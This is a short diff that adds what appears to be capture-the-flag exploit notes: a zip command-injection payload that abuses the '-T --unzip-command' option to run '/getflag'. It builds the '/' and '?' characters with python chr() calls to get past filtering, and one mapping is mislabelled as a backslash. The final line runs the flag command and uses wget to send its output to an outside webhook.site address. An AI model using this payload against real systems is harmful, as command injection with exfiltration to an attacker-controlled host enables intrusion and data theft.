@@ -1,0 +1,6 @@
+zip a.zip db.txt -T --unzip-command="/getflag"
+
+$(python3 -c 'print(chr(47))')  =  \
+$(python3 -c 'print(chr(63))')  =  ?
+
+--unzip-command=`wget webhook.site$(python3 -c 'print(chr(47))')70a375c9-00cd-4250-8aaa-5239ded9ab80$(python3 -c 'print(chr(63))')a=$($(python3 -c 'print(chr(47))')getflag)`
